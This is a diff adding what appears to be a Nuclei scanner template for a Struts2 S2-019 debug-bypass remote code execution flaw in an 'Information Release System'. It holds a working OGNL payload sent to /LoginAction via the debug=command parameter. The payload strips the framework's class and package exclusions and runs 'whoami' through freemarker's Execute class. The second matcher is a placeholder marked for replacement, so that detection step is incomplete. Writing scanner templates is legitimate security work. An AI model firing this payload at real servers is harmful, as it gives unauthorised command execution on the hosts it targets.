@@ -1,0 +1,47 @@
+id: information-release-system-rce
+info:
+  name: Information Release System St2-019 Debug Bypass RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The information release system uses the Struts2 framework. The system has a struts2-019 vulnerability. By bypassing it, arbitrary commands can be executed to obtain server permissions.
+  tags: command-execution,rce
+  reference:
+    - http://zhsdmedia.com
+    - https://fofa.so/
+
+variables:
+  rand1: "{{rand_int(150000, 7999999)}}"
+  rand2: "{{rand_int(250000, 9999999)}}"
+  rand3: "{{to_number(rand1) + to_number(rand2)}}"
+  payload: "{{url_encode(concat(rand1, '+', rand2))}}"
+  cmd: "{{url_encode('(\\#U=\\#application[\\\'org.apache.tomcat.InstanceManager\\\']).(\\#p=\\#U.newInstance(\\\'org.apache.commons.collections.BeanMap\\\')).(\\#s=\\#attr[\\\'struts.valueStack\\\']).(\\#p.setBean(\\#s)).(\\#context=\\#p.get(\\\'context\\\')).(\\#p.setBean(\\#context)).(\\#sm=\\#p.get(\\\'memberAccess\\\')).(\\#e=\\#U.newInstance(\\\'java.util.HashSet\\\')).(\\#p.setBean(\\#sm)).(\\#p.put(\\\'excludedClasses\\\',\\#e)).(\\#p.put(\\\'excludedPackageNames\\\',\\#e)).(\\#c=\\#U.newInstance(\\\'freemarker.template.utility.Execute\\\')).(\\#cmd=\\\'whoami\\\').(\\#c.exec(\\#cmd))')}}"
+
+http:
+  - raw:
+      - |
+        POST /LoginAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        debug=command&expression={{payload}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{rand3}}"
+        part: body
+
+  - raw:
+      - |
+        POST /LoginAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        debug=command&expression={{cmd}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Execution Result"  # Replace with the expected command execution output
+        part: body
